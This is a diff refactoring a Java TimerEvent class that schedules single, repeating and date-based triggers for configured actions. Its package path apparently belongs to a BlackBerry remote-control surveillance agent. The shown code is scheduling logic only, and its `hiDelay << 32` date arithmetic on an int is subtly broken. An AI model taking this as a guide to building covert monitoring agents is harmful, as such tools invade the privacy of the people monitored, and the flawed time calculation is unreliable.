@@ -16,6 +16,7 @@ import com.ht.rcs.blackberry.Conf;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
+import com.ht.rcs.blackberry.utils.Utils;
 
 public class TimerEvent extends Event {
     private static final int SLEEP_TIME = 1000;
@@ -31,89 +32,59 @@ public class TimerEvent extends Event {
 
     public TimerEvent(int actionId, byte[] confParams) {
         super(Event.EVENT_TIMER, actionId, confParams);
-
-        setEvery(1000);
-        timestamp = new Date();
     }
-
+    
     public TimerEvent(int actionId_, int type_, int loDelay_, int hiDelay_) {
         super(Event.EVENT_TIMER, actionId_, "TimerEvent");
         this.type = type_;
         this.loDelay = loDelay_;
         this.hiDelay = hiDelay_;
+        init();
     }
-
-    protected void actualRun() {
-        // #debug
-        debug.trace("actualRun");
-        // #ifdef DBC
-        Check.requires(statusObj != null, "StatusObj NULL");
-        // #endif
-
-        Date now;
-        long wait;
+    private void init() {
 
         switch (this.type) {
         case Conf.CONF_TIMER_SINGLE:
-
-            wait = loDelay;
-            now = new Date();
-
-            if (now.getTime() - timestamp.getTime() > wait) {
-                // #debug
-                debug.trace("TIMER_SINGLE");
-                trigger();
-                //#debug
-                debug.trace("stopping timer single");
-                stop();
-                return;
-            }
-
+            // #debug
+            debug.trace("CONF_TIMER_SINGLE");
+            setDelay(loDelay);
+            setPeriod(NEVER);
             break;
         case Conf.CONF_TIMER_REPEAT:
-            wait = loDelay;
-            now = new Date();
-
-            if (now.getTime() - timestamp.getTime() > wait) {
-                // #debug
-                debug.trace("TIMER_REPEAT");
-                timestamp = now;
-                trigger();
-            }
+            // #debug
+            debug.trace("CONF_TIMER_REPEAT");
+            setPeriod(loDelay);
+            setDelay(loDelay);
             break;
         case Conf.CONF_TIMER_DATE:
-
+            // #debug
+            debug.trace("CONF_TIMER_DATE");
             long tmpTime = hiDelay << 32;
             tmpTime += loDelay;
+            //#mdebug
+            Date date = new Date(tmpTime);
+            debug.trace("TimerDate: "+ date);
+            //#enddebug
 
-            Date tmpDate = new Date(tmpTime);
-            // #debug
-            debug.trace(tmpDate.toString());
-
-            now = new Date();
-
-            if (now.getTime() > tmpTime) {
-                // #debug
-                debug.trace("TIMER_DATE");
-                trigger();
-                //#debug
-                debug.trace("stopping timer date");
-                stop();
-                return;
-            }
-
+            setPeriod(NEVER);
+            long now = Utils.getTime();
+            setDelay(tmpTime - now);
             break;
         case Conf.CONF_TIMER_DELTA:
             // TODO: da implementare
             // #debug
-            debug.trace("TIMER_DELTA");
+            debug.trace("CONF_TIMER_DELTA");
             break;
         default:
             // #debug
             debug.error("shouldn't be here");
             break;
         }
+    }
 
+    protected void actualRun() {
+        debug.trace("actualRun");
+        trigger();
     }
 
     protected boolean parse(byte[] confParams) {
@@ -133,6 +104,8 @@ public class TimerEvent extends Event {
             debug.error("params FAILED");
             return false;
         }
+
+        init();
 
         return true;
     }
